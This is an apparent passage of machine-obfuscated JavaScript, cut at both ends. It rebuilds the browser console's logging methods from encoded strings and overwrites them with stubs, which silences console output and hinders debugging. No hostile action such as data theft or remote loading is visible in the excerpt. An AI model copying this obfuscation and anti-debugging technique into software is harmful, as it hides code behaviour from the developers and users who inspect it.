J=G[s(u7.uS,u7.uL)+s(u7.ul,u7.uf)+'e']=G[s(u7.uB,u7.uO)+s(u7.uY,u7.uE)+'e']||{},K=[s(u7.uH,u7.uq),s(u7.ur,u7.r)+'n',s(u7.up,u7.uX)+'o',s(u7.ua,u7.uc)+'or',s(u7.uV,u7.uf)+s(u7.ut,u7.ue)+s(u7.uZ,u7.ub),s(u7.uw,u7.Z)+'le',s(u7.uG,u7.ug)+'ce'];for(var m=-0xe2*0xa+-0x2*-0x107+-0x33*-0x22;m<K[s(u7.uJ,u7.w)+s(u7.uK,u7.um)];m++){var T=L[s(u7.uT,u7.uv)+s(u7.ux,u7.ui)+s(u7.uA,u7.Y)+'or'][s(u7.uy,u7.uW)+s(u7.un,u7.uF)+s(u7.uR,u7.ue)][s(u7.uj,u7.uk)+'d'](L),v=K[m],x=J[v]||T;T[s(u7.uC,u7.Y)+s(u7.ud,u7.us)+s(u7.uQ,u7.uh)]=L[s(u7.uI,u7.uq)+'d'](L),T[s(u7.uP,u7.ue)+s(u7.uz,u7.ue)+'ng']=x[s(u7.uM,u7.uU)+s(u7.uo,u7.uD)+'ng'][s(u7.uN,u7.S0)+'d'](x),J[v]=T;}});return b(),t[Q(u8.u,u8.S)+Q(u8.L,u8.l)+'f'](e)!==-(0x1777+-0x1e62+0x1bb*0x4);}}());};